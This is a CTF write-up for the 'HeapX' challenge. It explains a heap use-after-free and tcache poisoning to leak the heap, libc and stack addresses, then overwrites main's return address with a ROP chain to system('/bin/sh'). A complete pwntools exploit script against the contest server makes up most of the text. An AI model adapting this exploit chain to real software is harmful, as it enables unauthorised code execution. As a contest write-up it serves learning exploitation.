# HeapX

```
We discovered the Falcon 9 rocket's log aggregator, HeapX, can you pwn it and take control before it reaches orbit?

    heapx
    libc.so.6
    ld.so

nc chal.sunshinectf.games 25004 
```

This problem gives a UAF, also you can allocate infinite chunks, but the first 16 chunks allocated can be written to, read from or freed.

A convinience is given that for editing a chunk, we can specify the offset from where to write, but the offset and size cannot exceed the chunk size.

The major obstacle we face here is the first 16 chunks allocated will be freed before returning from main.

It will be really nasty to make the 16 chunks (including our arbitrary alloced chunks and chunks for UAF read and such) to all be legal to be freed. Therefore, I resolved to another method: cover up the pointers and sizes in the bss array.

At first, I want to leak proc address and do arbitrary alloc to bss segment which contains the pointers to be freed. However, I tried to arbitrary alloc to libc's got first and it failed sadly, due to the fact that it is not writable. Then I found the index to the array is on stack, so we can arbitrary alloc to stack, cover the return address of main function to a rop chain and cover the index to 0.

Then we allocate 16 chunks legally and can solve the problem.

## exp

```py
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
# p = process("./heapx")
p = remote("chal.sunshinectf.games", 25004)
libc = ELF("./libc.so.6")

def create(size):
    p.recvuntil("> ")
    p.sendline("new")
    p.sendline(str(size))

def delete(index):
    p.recvuntil("> ")
    p.sendline("delete")
    p.sendline(str(index))

def show(idx):
    p.recvuntil("> ")
    p.sendline("read")
    p.sendline(str(idx))

def edit(idx, offset, content):
    p.recvuntil("> ")
    p.sendline("write")
    p.sendline(str(idx))
    p.sendline(str(offset))
    p.recvuntil("Enter log data: ")
    p.sendline(content)

# try leak
create(0x80) # 0
delete(0)
show(0)
heap_base = u64(p.recv(5).ljust(8,b'\x00'))*0x1000
log.info("heap_base: "+hex(heap_base))
create(0x428) # 1
create(0x100)  # 2
create(0x100) # 3
delete(1)
show(1)
libc_leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info("libc_leak: "+hex(libc_leak))
libc_base = libc_leak - 0x210b20
stderr_leak = libc_base + 0x20fe80
log.info("libc_base: "+hex(libc_base))
log.info("stderr: "+hex(stderr_leak))

environ = libc_base + libc.symbols["environ"]
# environ leak
delete(2)
delete(3)

edit(3, 0, p64((environ - 0x18) ^(heap_base >> 12)))
create(0x100) # 4

create(0x100) # 5

edit(5, 0, b"a"*0x16 + b"bb")
show(5)
stack_leaks = p.recv(0x18 + 6)
stack_leak = u64(stack_leaks[0x18:0x18+6].ljust(8,b'\x00'))
log.info("stack_leak: "+hex(stack_leak))
# tcache poisoning to stack
rbp = stack_leak - 0x138 - 0x20
create(0xf0) # 6
create(0xf0) # 7
delete(6)
delete(7)
edit(7, 0, p64(rbp ^ (heap_base >> 12)))
create(0xf0) # 8
create(0xf0) # 9
pop_rdi = libc_base + 0x119e9c
ret = pop_rdi + 1
binshell = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
edit(9, 0x28, p64(pop_rdi) + p64(binshell) + p64(ret) + p64(system))

edit(9, 0x8, b"\x00")
for i in range(0x10):
    create(0x20)

p.recvuntil("> ")
p.sendline("exit")
p.interactive()
```
